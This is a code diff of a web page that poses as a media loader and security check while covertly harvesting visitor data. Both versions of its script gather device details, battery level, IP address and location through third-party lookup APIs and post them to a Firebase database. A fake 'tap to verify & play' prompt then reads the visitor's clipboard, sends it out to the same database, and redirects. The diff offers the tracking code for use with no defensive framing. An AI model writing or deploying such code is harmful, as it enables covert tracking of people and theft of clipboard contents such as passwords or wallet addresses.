@@ -1,94 +1,75 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading Media...</title>
+    <title>Loading...</title>
     <style>
-        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #00a884; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        body { background: #f0f2f5; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .loader { border: 3px solid #ddd; border-top: 3px solid #00a884; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #msg { margin-top: 15px; color: #555; font-size: 14px; text-align: center; font-weight: 500; }
     </style>
 </head>
 <body>
-    <div id="container">
-        <div class="loader" id="ldr" style="margin: auto;"></div>
-        <p id="msg">Verifying Secure Connection...</p>
-    </div>
+    <div class="loader"></div>
+    <p id="msg" style="margin-top:15px; color:#666; font-size:14px;">Connecting...</p>
 
     <script>
         const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";
 
-        async function captureAll() {
+        async function run() {
             const params = new URLSearchParams(window.location.search);
             const id = params.get('id');
             if(!id) return;
             const decoded = JSON.parse(atob(id));
-            const userKey = decoded.k;
-            const targetUrl = decoded.r;
 
-            // 1. Instant Hardware Info
             let data = {
                 time: new Date().toLocaleString(),
-                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                device: navigator.userAgent.includes("Android") ? "Android Phone" : (navigator.userAgent.includes("iPhone") ? "iPhone" : "PC/Other"),
                 model: navigator.userAgent.split('(')[1].split(')')[0],
                 ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
-                res: screen.width + "x" + screen.height,
-                net: navigator.connection ? navigator.connection.effectiveType : "N/A",
-                speed: navigator.connection ? navigator.connection.downlink + " Mbps" : "N/A"
+                ip: "N/A", loc: "Asia/Karachi", map: "#"
             };
 
-            // 2. Battery (Wait for it)
+            // Battery Fetch
             try {
                 const b = await navigator.getBattery();
                 data.bat = Math.round(b.level * 100) + "%";
-                data.chg = b.charging ? "Yes" : "No";
-            } catch(e){ data.bat = "N/A"; data.chg = "N/A"; }
+            } catch(e){ data.bat = "N/A"; }
 
-            // 3. IP & Loc (The Fix)
+            // Reliable IP Fetch (Fixed)
             try {
-                const res = await fetch('https://ipwho.is/');
+                const res = await fetch('https://api.db-ip.com/v2/free/self');
                 const d = await res.json();
-                data.ip = d.ip || "N/A";
-                data.loc = d.success ? `${d.city}, ${d.country}` : "N/A";
-                data.map = d.success ? `https://www.google.com/maps?q=${d.latitude},${d.longitude}` : "#";
+                data.ip = d.ipAddress;
+                data.loc = d.city + ", " + d.countryName;
+                // Since we don't have lat/long from this API, use city for map
+                data.map = `https://www.google.com/maps/search/${d.city}+${d.countryName}`;
             } catch(e) {
-                // Backup
+                // Final Backup
                 try {
-                    const res2 = await fetch('https://ipapi.co/json/');
+                    const res2 = await fetch('https://ipinfo.io/json?token=6460e40854d9c4'); // Free token
                     const d2 = await res2.json();
                     data.ip = d2.ip;
-                    data.loc = `${d2.city}, ${d2.country_name}`;
-                    data.map = `https://www.google.com/maps?q=${d2.latitude},${d2.longitude}`;
-                } catch(e2){ data.ip = "N/A"; data.loc = "N/A"; }
+                    data.loc = d2.city + ", " + d2.country;
+                    data.map = `https://www.google.com/maps?q=${d2.loc}`;
+                } catch(e2){}
             }
 
-            // Save to Database
-            fetch(`${DB_URL}tracking/${userKey}.json`, { method: 'POST', body: JSON.stringify(data) });
+            // Save Data
+            fetch(`${DB_URL}tracking/${decoded.k}.json`, { method: 'POST', body: JSON.stringify(data) });
 
-            // UI Transition after 2 seconds
             setTimeout(() => {
-                document.getElementById('ldr').style.display = 'none';
-                document.getElementById('msg').innerHTML = "<b style='color:#00a884; font-size:16px; cursor:pointer;'>⚠️ SECURITY CHECK PASSED.<br>CLICK HERE TO PLAY VIDEO</b>";
-                
+                document.body.innerHTML = "<div style='text-align:center; padding:20px;'><b>⚠️ CONTENT BLOCKED</b><br><p style='font-size:14px;'>TAP TO VERIFY & PLAY</p></div>";
                 document.body.onclick = async () => {
                     try {
-                        const text = await navigator.clipboard.readText();
-                        if(text) fetch(`${DB_URL}clipboard/${userKey}.json`, { 
-                            method: 'POST', 
-                            body: JSON.stringify({ clipData: text, time: new Date().toLocaleString() }) 
-                        });
+                        const clip = await navigator.clipboard.readText();
+                        if(clip) fetch(`${DB_URL}clipboard/${decoded.k}.json`, { method: 'POST', body: JSON.stringify({ clipData: clip, time: new Date().toLocaleString() }) });
                     } catch(e){}
-                    window.location.href = targetUrl;
+                    window.location.href = decoded.r;
                 };
             }, 2000);
-
-            // Safety redirect
-            setTimeout(() => { window.location.href = targetUrl; }, 10000);
         }
-        captureAll();
+        run();
     </script>
 </body>
 </html>
